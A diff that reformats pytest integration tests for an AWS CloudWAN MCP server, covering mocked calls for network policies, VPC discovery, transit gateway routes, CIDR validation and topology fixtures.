-            }),
-            'Description': 'Production network policy',
-            'CreatedAt': datetime(2024, 1, 15, 10, 30, 45)
+            ),
+            "Description": "Production network policy",
+            "CreatedAt": datetime(2024, 1, 15, 10, 30, 45),
         }
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.get_core_network_policy.return_value = {'CoreNetworkPolicy': sample_policy}
+            mock_client.get_core_network_policy.return_value = {"CoreNetworkPolicy": sample_policy}
             mock_get_client.return_value = mock_client
 
-            result = await get_core_network_policy('core-network-123', alias='LIVE')
+            result = await get_core_network_policy("core-network-123", alias="LIVE")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['core_network_id'] == 'core-network-123'
-            assert parsed['alias'] == 'LIVE'
-            assert parsed['policy_version_id'] == '1'
-            assert 'policy_document' in parsed
-            mock_client.get_core_network_policy.assert_called_once_with(
-                CoreNetworkId='core-network-123',
-                Alias='LIVE'
-            )
+            assert parsed["success"] is True
+            assert parsed["core_network_id"] == "core-network-123"
+            assert parsed["alias"] == "LIVE"
+            assert parsed["policy_version_id"] == "1"
+            assert "policy_document" in parsed
+            mock_client.get_core_network_policy.assert_called_once_with(CoreNetworkId="core-network-123", Alias="LIVE")
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_get_core_network_policy_not_found(self):
         """Test get_core_network_policy with resource not found."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.get_core_network_policy.side_effect = ClientError(
-                {'Error': {'Code': 'ResourceNotFoundException', 'Message': 'Core network not found'}},
-                'GetCoreNetworkPolicy'
+                {"Error": {"Code": "ResourceNotFoundException", "Message": "Core network not found"}},
+                "GetCoreNetworkPolicy",
             )
             mock_get_client.return_value = mock_client
 
-            result = await get_core_network_policy('invalid-network')
+            result = await get_core_network_policy("invalid-network")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert 'Core network not found' in parsed['error']
-            assert parsed['error_code'] == 'ResourceNotFoundException'
+            assert parsed["success"] is False
+            assert "Core network not found" in parsed["error"]
+            assert parsed["error_code"] == "ResourceNotFoundException"
 
 
 class TestDiscoverVPCsOperation:
@@ -226,48 +224,48 @@
         """Test discover_vpcs with multiple VPCs."""
         sample_vpcs = [
             {
-                'VpcId': 'vpc-01234567890abcdef0',
-                'State': 'available',
-                'CidrBlock': '10.0.0.0/16',
-                'Tags': [{'Key': 'Name', 'Value': 'Production VPC'}]
+                "VpcId": "vpc-01234567890abcdef0",
+                "State": "available",
+                "CidrBlock": "10.0.0.0/16",
+                "Tags": [{"Key": "Name", "Value": "Production VPC"}],
             },
             {
-                'VpcId': 'vpc-fedcba0987654321',
-                'State': 'available',
-                'CidrBlock': '172.16.0.0/12',
-                'Tags': [{'Key': 'Name', 'Value': 'Development VPC'}]
-            }
+                "VpcId": "vpc-fedcba0987654321",
+                "State": "available",
+                "CidrBlock": "172.16.0.0/12",
+                "Tags": [{"Key": "Name", "Value": "Development VPC"}],
+            },
         ]
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.describe_vpcs.return_value = {'Vpcs': sample_vpcs}
+            mock_client.describe_vpcs.return_value = {"Vpcs": sample_vpcs}
             mock_get_client.return_value = mock_client
 
-            result = await discover_vpcs(region='us-east-1')
+            result = await discover_vpcs(region="us-east-1")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 2
-            assert parsed['region'] == 'us-east-1'
-            assert len(parsed['vpcs']) == 2
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 2
+            assert parsed["region"] == "us-east-1"
+            assert len(parsed["vpcs"]) == 2
             mock_client.describe_vpcs.assert_called_once()
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_discover_vpcs_empty(self):
         """Test discover_vpcs with no VPCs found."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.describe_vpcs.return_value = {'Vpcs': []}
+            mock_client.describe_vpcs.return_value = {"Vpcs": []}
             mock_get_client.return_value = mock_client
 
             result = await discover_vpcs()
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['total_count'] == 0
-            assert parsed['vpcs'] == []
+            assert parsed["success"] is True
+            assert parsed["total_count"] == 0
+            assert parsed["vpcs"] == []
 
 
 class TestTraceNetworkPathOperation:
@@ -277,36 +275,36 @@
     @pytest.mark.asyncio
     async def test_trace_network_path_success(self):
         """Test trace_network_path with valid IPs."""
-        result = await trace_network_path('10.0.1.100', '172.16.1.200', region='us-west-2')
+        result = await trace_network_path("10.0.1.100", "172.16.1.200", region="us-west-2")
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['source_ip'] == '10.0.1.100'
-        assert parsed['destination_ip'] == '172.16.1.200'
-        assert parsed['region'] == 'us-west-2'
-        assert 'path_trace' in parsed
-        assert parsed['total_hops'] >= 1
+        assert parsed["success"] is True
+        assert parsed["source_ip"] == "10.0.1.100"
+        assert parsed["destination_ip"] == "172.16.1.200"
+        assert parsed["region"] == "us-west-2"
+        assert "path_trace" in parsed
+        assert parsed["total_hops"] >= 1
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_trace_network_path_invalid_ip(self):
         """Test trace_network_path with invalid IP address."""
-        result = await trace_network_path('invalid-ip', '10.0.1.1')
+        result = await trace_network_path("invalid-ip", "10.0.1.1")
 
         parsed = json.loads(result)
-        assert parsed['success'] is False
-        assert 'trace_network_path failed:' in parsed['error']
+        assert parsed["success"] is False
+        assert "trace_network_path failed:" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_trace_network_path_ipv6(self):
         """Test trace_network_path with IPv6 addresses."""
-        result = await trace_network_path('2001:db8::1', '2001:db8::2')
+        result = await trace_network_path("2001:db8::1", "2001:db8::2")
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['source_ip'] == '2001:db8::1'
-        assert parsed['destination_ip'] == '2001:db8::2'
+        assert parsed["success"] is True
+        assert parsed["source_ip"] == "2001:db8::1"
+        assert parsed["destination_ip"] == "2001:db8::2"
 
 
 class TestValidateIPCIDROperation:
@@ -316,49 +314,49 @@
     @pytest.mark.asyncio
     async def test_validate_ip_cidr_valid_ip(self):
         """Test validate_ip_cidr with valid IP validation."""
-        result = await validate_ip_cidr('validate_ip', ip='192.168.1.100')
+        result = await validate_ip_cidr("validate_ip", ip="192.168.1.100")
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['operation'] == 'validate_ip'
-        assert parsed['ip_address'] == '192.168.1.100'
-        assert parsed['version'] == 4
-        assert parsed['is_private'] is True
+        assert parsed["success"] is True
+        assert parsed["operation"] == "validate_ip"
+        assert parsed["ip_address"] == "192.168.1.100"
+        assert parsed["version"] == 4
+        assert parsed["is_private"] is True
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_validate_ip_cidr_valid_cidr(self):
         """Test validate_ip_cidr with valid CIDR validation."""
-        result = await validate_ip_cidr('validate_cidr', cidr='10.0.0.0/24')
+        result = await validate_ip_cidr("validate_cidr", cidr="10.0.0.0/24")
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['operation'] == 'validate_cidr'
-        assert parsed['network'] == '10.0.0.0/24'
-        assert parsed['network_address'] == '10.0.0.0'
-        assert parsed['broadcast_address'] == '10.0.0.255'
-        assert parsed['num_addresses'] == 256
+        assert parsed["success"] is True
+        assert parsed["operation"] == "validate_cidr"
+        assert parsed["network"] == "10.0.0.0/24"
+        assert parsed["network_address"] == "10.0.0.0"
+        assert parsed["broadcast_address"] == "10.0.0.255"
+        assert parsed["num_addresses"] == 256
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_validate_ip_cidr_invalid_operation(self):
         """Test validate_ip_cidr with invalid operation."""
-        result = await validate_ip_cidr('invalid_operation')
+        result = await validate_ip_cidr("invalid_operation")
 
         parsed = json.loads(result)
-        assert parsed['success'] is False
-        assert 'Invalid operation or missing parameters' in parsed['error']
-        assert 'valid_operations' in parsed
+        assert parsed["success"] is False
+        assert "Invalid operation or missing parameters" in parsed["error"]
+        assert "valid_operations" in parsed
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_validate_ip_cidr_invalid_cidr(self):
         """Test validate_ip_cidr with invalid CIDR."""
-        result = await validate_ip_cidr('validate_cidr', cidr='invalid/cidr')
+        result = await validate_ip_cidr("validate_cidr", cidr="invalid/cidr")
 
         parsed = json.loads(result)
-        assert parsed['success'] is False
-        assert 'validate_ip_cidr failed:' in parsed['error']
+        assert parsed["success"] is False
+        assert "validate_ip_cidr failed:" in parsed["error"]
 
 
 class TestAnalyzeTGWRoutesOperation:
@@ -369,49 +367,40 @@
     async def test_analyze_tgw_routes_success(self):
         """Test analyze_tgw_routes with successful response."""
         sample_routes = [
-            {
-                'DestinationCidrBlock': '10.0.0.0/16',
-                'State': 'active',
-                'Type': 'static'
-            },
-            {
-                'DestinationCidrBlock': '172.16.0.0/12',
-                'State': 'blackhole',
-                'Type': 'static'
-            }
+            {"DestinationCidrBlock": "10.0.0.0/16", "State": "active", "Type": "static"},
+            {"DestinationCidrBlock": "172.16.0.0/12", "State": "blackhole", "Type": "static"},
         ]
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
-            mock_client.search_transit_gateway_routes.return_value = {'Routes': sample_routes}
+            mock_client.search_transit_gateway_routes.return_value = {"Routes": sample_routes}
             mock_get_client.return_value = mock_client
 
-            result = await analyze_tgw_routes('tgw-rtb-123456789')
+            result = await analyze_tgw_routes("tgw-rtb-123456789")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['route_table_id'] == 'tgw-rtb-123456789'
-            assert parsed['analysis']['total_routes'] == 2
-            assert parsed['analysis']['active_routes'] == 1
-            assert parsed['analysis']['blackholed_routes'] == 1
+            assert parsed["success"] is True
+            assert parsed["route_table_id"] == "tgw-rtb-123456789"
+            assert parsed["analysis"]["total_routes"] == 2
+            assert parsed["analysis"]["active_routes"] == 1
+            assert parsed["analysis"]["blackholed_routes"] == 1
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_analyze_tgw_routes_access_denied(self):
         """Test analyze_tgw_routes with access denied."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.search_transit_gateway_routes.side_effect = ClientError(
-                {'Error': {'Code': 'UnauthorizedOperation', 'Message': 'Not authorized'}},
-                'SearchTransitGatewayRoutes'
+                {"Error": {"Code": "UnauthorizedOperation", "Message": "Not authorized"}}, "SearchTransitGatewayRoutes"
             )
             mock_get_client.return_value = mock_client
 
-            result = await analyze_tgw_routes('tgw-rtb-invalid')
+            result = await analyze_tgw_routes("tgw-rtb-invalid")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'UnauthorizedOperation'
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "UnauthorizedOperation"
 
 
 class TestAnalyzeTGWPeersOperation:
@@ -422,46 +411,46 @@
     async def test_analyze_tgw_peers_success(self):
         """Test analyze_tgw_peers with successful response."""
         sample_attachment = {
-            'TransitGatewayAttachmentId': 'tgw-attach-123456789',
-            'State': 'available',
-            'Status': {'Code': 'available'},
-            'CreatedAt': datetime(2024, 1, 15, 10, 30, 45),
-            'AccepterTgwInfo': {'TransitGatewayId': 'tgw-987654321'},
-            'RequesterTgwInfo': {'TransitGatewayId': 'tgw-123456789'},
-            'Tags': []
+            "TransitGatewayAttachmentId": "tgw-attach-123456789",
+            "State": "available",
+            "Status": {"Code": "available"},
+            "CreatedAt": datetime(2024, 1, 15, 10, 30, 45),
+            "AccepterTgwInfo": {"TransitGatewayId": "tgw-987654321"},
+            "RequesterTgwInfo": {"TransitGatewayId": "tgw-123456789"},
+            "Tags": [],
         }
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.describe_transit_gateway_peering_attachments.return_value = {
-                'TransitGatewayPeeringAttachments': [sample_attachment]
+                "TransitGatewayPeeringAttachments": [sample_attachment]
             }
             mock_get_client.return_value = mock_client
 
-            result = await analyze_tgw_peers('tgw-attach-123456789')
+            result = await analyze_tgw_peers("tgw-attach-123456789")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['peer_id'] == 'tgw-attach-123456789'
-            assert parsed['peer_analysis']['state'] == 'available'
-            assert parsed['peer_analysis']['status'] == 'available'
+            assert parsed["success"] is True
+            assert parsed["peer_id"] == "tgw-attach-123456789"
+            assert parsed["peer_analysis"]["state"] == "available"
+            assert parsed["peer_analysis"]["status"] == "available"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_analyze_tgw_peers_not_found(self):
         """Test analyze_tgw_peers with peering attachment not found."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.describe_transit_gateway_peering_attachments.return_value = {
-                'TransitGatewayPeeringAttachments': []
+                "TransitGatewayPeeringAttachments": []
             }
             mock_get_client.return_value = mock_client
 
-            result = await analyze_tgw_peers('invalid-peer-id')
+            result = await analyze_tgw_peers("invalid-peer-id")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert 'No peering attachment found' in parsed['error']
+            assert parsed["success"] is False
+            assert "No peering attachment found" in parsed["error"]
 
 
 class TestValidateCloudWANPolicyOperation:
@@ -472,47 +461,41 @@
     async def test_validate_cloudwan_policy_valid(self):
         """Test validate_cloudwan_policy with valid policy document."""
         valid_policy = {
-            'version': '2021.12',
-            'core-network-configuration': {
-                'asn-ranges': ['64512-64555'],
-                'edge-locations': [
-                    {'location': 'us-east-1'},
-                    {'location': 'us-west-2'}
-                ]
-            }
+            "version": "2021.12",
+            "core-network-configuration": {
+                "asn-ranges": ["64512-64555"],
+                "edge-locations": [{"location": "us-east-1"}, {"location": "us-west-2"}],
+            },
         }
 
         result = await validate_cloudwan_policy(valid_policy)
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['overall_status'] == 'valid'
-        assert parsed['policy_version'] == '2021.12'
-        assert len(parsed['validation_results']) >= 2
+        assert parsed["success"] is True
+        assert parsed["overall_status"] == "valid"
+        assert parsed["policy_version"] == "2021.12"
+        assert len(parsed["validation_results"]) >= 2
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_validate_cloudwan_policy_missing_fields(self):
         """Test validate_cloudwan_policy with missing required fields."""
         invalid_policy = {
-            'version': '2021.12'
+            "version": "2021.12"
             # Missing 'core-network-configuration'
         }
 
         result = await validate_cloudwan_policy(invalid_policy)
 
         parsed = json.loads(result)
-        assert parsed['success'] is True  # Function succeeds but validation fails
-        assert parsed['overall_status'] == 'invalid'
+        assert parsed["success"] is True  # Function succeeds but validation fails
+        assert parsed["overall_status"] == "invalid"
 
         # Check that missing field is reported
-        validation_results = parsed['validation_results']
-        missing_core_config = next(
-            (r for r in validation_results if r['field'] == 'core-network-configuration'),
-            None
-        )
+        validation_results = parsed["validation_results"]
+        missing_core_config = next((r for r in validation_results if r["field"] == "core-network-configuration"), None)
         assert missing_core_config is not None
-        assert missing_core_config['status'] == 'invalid'
+        assert missing_core_config["status"] == "invalid"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -521,9 +504,9 @@
         result = await validate_cloudwan_policy({})
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['overall_status'] == 'invalid'
-        assert parsed['policy_version'] == 'unknown'
+        assert parsed["success"] is True
+        assert parsed["overall_status"] == "invalid"
+        assert parsed["policy_version"] == "unknown"
 
 
 class TestManageTGWRoutesOperation:
@@ -533,48 +516,35 @@
     @pytest.mark.asyncio
     async def test_manage_tgw_routes_create(self):
         """Test manage_tgw_routes with route creation."""
-        result = await manage_tgw_routes(
-            'create',
-            'tgw-rtb-123456789',
-            '10.0.0.0/16',
-            region='us-east-1'
-        )
+        result = await manage_tgw_routes("create", "tgw-rtb-123456789", "10.0.0.0/16", region="us-east-1")
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['operation'] == 'create'
-        assert parsed['route_table_id'] == 'tgw-rtb-123456789'
-        assert parsed['destination_cidr'] == '10.0.0.0/16'
-        assert parsed['result']['status'] == 'completed'
+        assert parsed["success"] is True
+        assert parsed["operation"] == "create"
+        assert parsed["route_table_id"] == "tgw-rtb-123456789"
+        assert parsed["destination_cidr"] == "10.0.0.0/16"
+        assert parsed["result"]["status"] == "completed"
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_manage_tgw_routes_invalid_cidr(self):
         """Test manage_tgw_routes with invalid CIDR block."""
-        result = await manage_tgw_routes(
-            'create',
-            'tgw-rtb-123456789',
-            'invalid-cidr'
-        )
+        result = await manage_tgw_routes("create", "tgw-rtb-123456789", "invalid-cidr")
 
         parsed = json.loads(result)
-        assert parsed['success'] is False
-        assert 'manage_tgw_routes failed:' in parsed['error']
+        assert parsed["success"] is False
+        assert "manage_tgw_routes failed:" in parsed["error"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_manage_tgw_routes_blackhole(self):
         """Test manage_tgw_routes with blackhole operation."""
-        result = await manage_tgw_routes(
-            'blackhole',
-            'tgw-rtb-123456789',
-            '192.168.0.0/24'
-        )
+        result = await manage_tgw_routes("blackhole", "tgw-rtb-123456789", "192.168.0.0/24")
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['operation'] == 'blackhole'
-        assert parsed['destination_cidr'] == '192.168.0.0/24'
+        assert parsed["success"] is True
+        assert parsed["operation"] == "blackhole"
+        assert parsed["destination_cidr"] == "192.168.0.0/24"
 
 
 class TestAnalyzeSegmentRoutesOperation:
@@ -585,49 +555,45 @@
     async def test_analyze_segment_routes_success(self):
         """Test analyze_segment_routes with successful analysis."""
         sample_policy = {
-            'CoreNetworkPolicy': {
-                'PolicyVersionId': '2',
-                'PolicyDocument': json.dumps({
-                    'version': '2021.12',
-                    'segments': [
-                        {'name': 'production', 'require-attachment-acceptance': False}
-                    ]
-                })
+            "CoreNetworkPolicy": {
+                "PolicyVersionId": "2",
+                "PolicyDocument": json.dumps(
+                    {"version": "2021.12", "segments": [{"name": "production", "require-attachment-acceptance": False}]}
+                ),
             }
         }
 
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.get_core_network_policy.return_value = sample_policy
             mock_get_client.return_value = mock_client
 
-            result = await analyze_segment_routes('core-network-123', 'production')
+            result = await analyze_segment_routes("core-network-123", "production")
 
             parsed = json.loads(result)
-            assert parsed['success'] is True
-            assert parsed['core_network_id'] == 'core-network-123'
-            assert parsed['segment_name'] == 'production'
-            assert 'analysis' in parsed
-            assert 'route_optimization' in parsed['analysis']
-            assert 'recommendations' in parsed['analysis']
+            assert parsed["success"] is True
+            assert parsed["core_network_id"] == "core-network-123"
+            assert parsed["segment_name"] == "production"
+            assert "analysis" in parsed
+            assert "route_optimization" in parsed["analysis"]
+            assert "recommendations" in parsed["analysis"]
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_analyze_segment_routes_policy_not_found(self):
         """Test analyze_segment_routes with policy not found."""
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
             mock_client.get_core_network_policy.side_effect = ClientError(
-                {'Error': {'Code': 'ResourceNotFoundException', 'Message': 'Policy not found'}},
-                'GetCoreNetworkPolicy'
+                {"Error": {"Code": "ResourceNotFoundException", "Message": "Policy not found"}}, "GetCoreNetworkPolicy"
             )
             mock_get_client.return_value = mock_client
 
-            result = await analyze_segment_routes('invalid-network', 'production')
+            result = await analyze_segment_routes("invalid-network", "production")
 
             parsed = json.loads(result)
-            assert parsed['success'] is False
-            assert parsed['error_code'] == 'ResourceNotFoundException'
+            assert parsed["success"] is False
+            assert parsed["error_code"] == "ResourceNotFoundException"
 
 
 class TestListNetworkFunctionGroupsOperation:
@@ -637,32 +603,32 @@
     @pytest.mark.asyncio
     async def test_list_network_function_groups_success(self):
         """Test list_network_function_groups with successful response."""
-        result = await list_network_function_groups(region='ap-southeast-1')
+        result = await list_network_function_groups(region="ap-southeast-1")
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['region'] == 'ap-southeast-1'
-        assert 'network_function_groups' in parsed
-        assert isinstance(parsed['network_function_groups'], list)
+        assert parsed["success"] is True
+        assert parsed["region"] == "ap-southeast-1"
+        assert "network_function_groups" in parsed
+        assert isinstance(parsed["network_function_groups"], list)
 
         # Check simulated data structure
-        if parsed['network_function_groups']:
-            nfg = parsed['network_function_groups'][0]
-            assert 'name' in nfg
-            assert 'description' in nfg
-            assert 'status' in nfg
+        if parsed["network_function_groups"]:
+            nfg = parsed["network_function_groups"][0]
+            assert "name" in nfg
+            assert "description" in nfg
+            assert "status" in nfg
 
     @pytest.mark.integration
     @pytest.mark.asyncio
     async def test_analyze_network_function_group_success(self):
         """Test analyze_network_function_group with successful analysis."""
-        result = await analyze_network_function_group('production-nfg', region='us-east-1')
+        result = await analyze_network_function_group("production-nfg", region="us-east-1")
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
-        assert parsed['group_name'] == 'production-nfg'
-        assert parsed['region'] == 'us-east-1'
-        assert 'analysis' in parsed
-        assert 'routing_policies' in parsed['analysis']
-        assert 'security_policies' in parsed['analysis']
-        assert 'performance_metrics' in parsed['analysis']
+        assert parsed["success"] is True
+        assert parsed["group_name"] == "production-nfg"
+        assert parsed["region"] == "us-east-1"
+        assert "analysis" in parsed
+        assert "routing_policies" in parsed["analysis"]
+        assert "security_policies" in parsed["analysis"]
+        assert "performance_metrics" in parsed["analysis"]

--- cloudwan-mcp-server/tests/integration/test_comprehensive_fixtures.py
+++ cloudwan-mcp-server/tests/integration/test_comprehensive_fixtures.py
@@ -37,26 +37,24 @@
         """Test enterprise hub-and-spoke topology processing."""
         topology = enterprise_hub_spoke_topology
 
-        assert topology['topology_type'] == 'hub_spoke'
-        assert len(topology['regions']) == 5
-        assert len(topology['core_networks']) == 5
+        assert topology["topology_type"] == "hub_spoke"
+        assert len(topology["regions"]) == 5
+        assert len(topology["core_networks"]) == 5
 
         # Test with mock responses using topology data
-        with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+        with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
             mock_client = Mock()
 
             # Use topology data for mock responses
-            mock_client.list_core_networks.return_value = {
-                'CoreNetworks': topology['core_networks']
-            }
+            mock_client.list_core_networks.return_value = {"CoreNetworks": topology["core_networks"]}
             mock_get_client.return_value = mock_client
 
             result = await list_core_networks()
             parsed = json.loads(result)
 
-            assert parsed['success'] is True
-            assert parsed['total_count'] == len(topology['core_networks'])
-            assert len(parsed['core_networks']) == 5
+            assert parsed["success"] is True
+            assert parsed["total_count"] == len(topology["core_networks"])
+            assert len(parsed["core_networks"]) == 5
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -64,28 +62,28 @@
         """Test full mesh topology processing."""
         topology = full_mesh_topology
 
-        assert topology['topology_type'] == 'full_mesh'
-        assert len(topology['regions']) == 4
+        assert topology["topology_type"] == "full_mesh"
+        assert len(topology["regions"]) == 4
 
         # Should have full mesh peering connections: n*(n-1)/2
         expected_connections = 4 * 3 // 2  # 6 connections
-        assert len(topology['peering_connections']) == expected_connections
+        assert len(topology["peering_connections"]) == expected_connections
 
         # Test VPC discovery with topology data
-        for region in topology['regions']:
-            region_vpcs = topology['vpc_attachments'][region]
+        for region in topology["regions"]:
+            region_vpcs = topology["vpc_attachments"][region]
 
-            with patch('awslabs.cloudwan_mcp_server.server.get_aws_client') as mock_get_client:
+            with patch("awslabs.cloudwan_mcp_server.server.get_aws_client") as mock_get_client:
                 mock_client = Mock()
-                mock_client.describe_vpcs.return_value = {'Vpcs': region_vpcs}
+                mock_client.describe_vpcs.return_value = {"Vpcs": region_vpcs}
                 mock_get_client.return_value = mock_client
 
                 result = await discover_vpcs(region=region)
                 parsed = json.loads(result)
 
-                assert parsed['success'] is True
-                assert parsed['region'] == region
-                assert len(parsed['vpcs']) == len(region_vpcs)
+                assert parsed["success"] is True
+                assert parsed["region"] == region
+                assert len(parsed["vpcs"]) == len(region_vpcs)
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -93,19 +91,19 @@
         """Test hierarchical topology validation."""
         topology = hierarchical_topology
 
-        assert topology['topology_type'] == 'hierarchical'
-        assert topology['levels'] == 3
-        assert topology['branches_per_level'] == 4
+        assert topology["topology_type"] == "hierarchical"
+        assert topology["levels"] == 3
+        assert topology["branches_per_level"] == 4
 
         # Validate hierarchy structure
-        root_node = topology['hierarchy']
-        assert root_node['level'] == 1
-        assert root_node['parent_id'] is None
-        assert len(root_node['children']) == 4
+        root_node = topology["hierarchy"]
+        assert root_node["level"] == 1
+        assert root_node["parent_id"] is None
+        assert len(root_node["children"]) == 4
 
         # Test that all core networks are present
         expected_networks = 1 + 4 + 16  # Level 1 + Level 2 + Level 3
-        assert len(topology['core_networks']) == expected_networks
+        assert len(topology["core_networks"]) == expected_networks
 
     @pytest.mark.integration
     @pytest.mark.asyncio
@@ -114,20 +112,20 @@
         topology = random_network_topology
 
         # Should handle any topology type
-        assert topology['topology_type'] in ['hub_spoke', 'full_mesh', 'hierarchical']
-        assert 'global_network' in topology
-        assert topology['global_network']['State'] == 'AVAILABLE'
+        assert topology["topology_type"] in ["hub_spoke", "full_mesh", "hierarchical"]
+        assert "global_network" in topology
+        assert topology["global_network"]["State"] == "AVAILABLE"
 
         # Basic structure validation regardless of type
-        if topology['topology_type'] == 'hub_spoke':
-            assert 'regions' in topology
-            assert 'vpc_attachments' in topology
-        elif topology['topology_type'] == 'full_mesh':
-            assert 'peering_connections' in topology
-            assert len(topology['peering_connections']) > 0
+        if topology["topology_type"] == "hub_spoke":
+            assert "regions" in topology
+            assert "vpc_attachments" in topology
+        elif topology["topology_type"] == "full_mesh":
+            assert "peering_connections" in topology
+            assert len(topology["peering_connections"]) > 0
         else:  # hierarchical
-            assert 'hierarchy' in topology
-            assert 'levels' in topology
+            assert "hierarchy" in topology
+            assert "levels" in topology
 
 
 class TestPolicyFixtureValidation:
@@ -140,22 +138,22 @@
         policy = enterprise_policy
 
         # Basic policy structure validation
-        assert policy['version'] == '2021.12'
-        assert 'core-network-configuration' in policy
-        assert 'segments' in policy
-        assert 'segment-actions' in policy
-        assert 'attachment-policies' in policy
+        assert policy["version"] == "2021.12"
+        assert "core-network-configuration" in policy
+        assert "segments" in policy
+        assert "segment-actions" in policy
+        assert "attachment-policies" in policy
 
         # Validate policy with our function
         result = await validate_cloudwan_policy(policy)
         parsed = json.loads(result)
 
-        assert parsed['success'] is True
-        assert 'overall_status' in parsed
-        assert parsed['policy_version'] == '2021.12'
+        assert parsed["success"] is True
+        assert "overall_status" in parsed
+        assert parsed["policy_version"] == "2021.12"
 
         # Should have comprehensive validation results
-        validation_results = parsed['validation_results']
+        validation_results = parsed["validation_results"]
         assert len(validation_results) >= 4  # At least version, core-config, segments, actions
 
     @pytest.mark.integration
@@ -165,26 +163,26 @@
         policy = security_policy
 
         # Validate security requirements
-        assert len(policy['segments']) == 4
-        security_segments = ['pci-compliant', 'hipaa-compliant', 'sox-compliant', 'security-tools']
+        assert len(policy["segments"]) == 4
+        security_segments = ["pci-compliant", "hipaa-compliant", "sox-compliant", "security-tools"]
 
-        for segment in policy['segments']:
-            assert segment['name'] in security_segments
-            if segment['name'] != 'security-tools':
+        for segment in policy["segments"]:
+            assert segment["name"] in security_segments
+            if segment["name"] != "security-tools":
                 # Compliance segments should require acceptance and isolation
-                assert segment['require-attachment-acceptance'] is True
-                assert segment['isolate-attachments'] is True
+                assert segment["require-attachment-acceptance"] is True
+                assert segment["isolate-attachments"] is True
 
         # Test policy validation
         result = await validate_cloudwan_policy(policy)
         parsed = json.loads(result)
 
-        assert parsed['success'] is True
+        assert parsed["success"] is True
 
         # Verify security-specific validation
         response_text = json.dumps(parsed)
-        assert 'pci-compliant' in response_text
-        assert 'hipaa-compliant' in response_text
+        assert "pci-compliant" in response_text
+        assert "hipaa-compliant" in response_text
 
     @pytest.mark.integration
     @pytest.mark.slowtest
@@ -199,14 +197,14 @@
         processing_time = time.time() - start_time
 
         parsed = json.loads(result)
-        assert parsed['success'] is True
+        assert parsed["success"] is True
 
         # Performance requirements
         assert processing_time < 10.0, f"Enterprise policy validation took {processing_time:.2f}s"
 
         # Policy should have realistic enterprise scale
-        assert len(policy['segments']) == 10
-        assert len(policy['attachment-policies']) == 50
+        assert len(policy["segments"]) == 10
+        assert len(policy["attachment-policies"]) == 50
 
 
